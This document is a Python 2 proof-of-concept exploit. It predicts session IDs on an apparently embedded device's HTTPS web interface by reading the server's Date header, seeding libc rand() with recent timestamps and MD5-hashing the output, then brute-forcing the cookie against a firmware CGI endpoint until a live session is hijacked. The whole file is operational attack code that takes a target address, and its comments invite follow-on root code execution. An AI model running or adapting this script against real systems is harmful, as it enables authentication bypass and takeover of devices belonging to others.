import sys
import time
import ctypes
import requests
import hashlib
import calendar
import email.utils as eut
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# fix the warnings...
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

i = 0

def get_timestamp(date):
    """
    this function just parses the date http response header string to
    generate a time tuple and then a timestamp from the epoch of 1970
    """
    return calendar.timegm(eut.parsedate(date))

def leak_server_time():
    """
    this function leaks the initial date...
    """
    r = requests.get("https://%s/" % target, verify=False)
    return r.headers['date']

def check_session(sessid):
    """
    here we just valid the generated session
    """
    r = requests.get('https://'+target+'/cgi-bin/firmware_updated.cgi', verify=False, cookies={"session_id": sessid })
    if "updated" in r.text:
        return True
    else:
        return False

def attack(timestamp):
    """
    We take the leaked timestamp and generate a session
    by seeding libc's rand() and then md5 the resultant
    """
    global i
    i += 1

    # add an extra second
    timestamp += i

    # seeding rand()
    libc.srand(timestamp)

    # md5 the session
    m = hashlib.md5()

    # so called, rand...
    m.update(str(libc.rand()))

    # our session
    return m.hexdigest()
	
def main():
    """
    The start of the pain train
    """
    global target, libc

    # the foo sauce
    libc = ctypes.CDLL('libc.so.6')

    if len(sys.argv) != 2:
        print "(+) usage: %s <target>" % sys.argv[0]
        print "(+) example: %s 172.16.175.123" % sys.argv[0]
        sys.exit(-1)

    target = sys.argv[1]
    print "(+) leaking timestamp..."
    ts = get_timestamp(leak_server_time())
    print "(+) re-winding sessions by 5 minutes..."

    # last 5 minutes, since a session last 6 minutes...
    ts = ts - (5*60)
    print "(+) started session guessing..."
	
    while True:
        attempt = attack(ts)
        c = check_session(attempt)
        if c == True:
            # do your evil things here, like get rce as root!
            print "(+) identified session: %s " % attempt
            print "(+) attacker can now log with this session!"
            break
			
if __name__ == '__main__':
    main()

